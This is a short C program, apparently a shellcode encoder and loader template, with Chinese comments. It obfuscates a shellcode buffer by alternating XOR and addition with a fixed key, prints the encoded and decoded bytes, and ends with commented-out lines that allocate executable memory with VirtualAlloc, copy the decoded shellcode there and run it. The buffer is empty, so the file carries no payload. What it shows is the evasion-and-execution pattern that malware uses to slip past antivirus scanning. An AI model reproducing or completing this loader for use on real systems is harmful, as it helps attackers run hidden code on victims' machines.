//Code on Bloodshed Dev-Cpp 
#include <stdio.h>
#include <Windows.h>

#define passcode 2000 
//密码

unsigned char buf[] = "";

int main(int argc, char* argv[])
{
	unsigned char enShellCode[5000];
	unsigned char deShellCode[5000];
	
	int nLen = sizeof(buf)-1;

	printf("这是加密后的shellcode\n"); 
	for (int i = 0; i<nLen; i++)
	{
		if((i % 2) == 0) {
			enShellCode[i] = (buf[i] ^ passcode) ;
			printf("\\x%x", enShellCode[i]);
		}
		else{
			enShellCode[i] = (buf[i] + passcode);
			printf("\\x%x", enShellCode[i]);
		}
	}

	printf("\n这是解密后的shellcode\n");

	for (int i = 0; i<nLen; i++)
	{
		if((i % 2) == 0) {
			deShellCode[i] = (enShellCode[i] ^ passcode) ;
			printf("\\x%x", deShellCode[i]);
		}
		else{
			deShellCode[i] = (enShellCode[i] - passcode);
			printf("\\x%x", deShellCode[i]);
		}
	}
	
	//LPVOID Memory = VirtualAlloc(NULL, sizeof deShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy(Memory, deShellCode, sizeof deShellCode);
	//((void(*)()) Memory)();

	return 0;
}

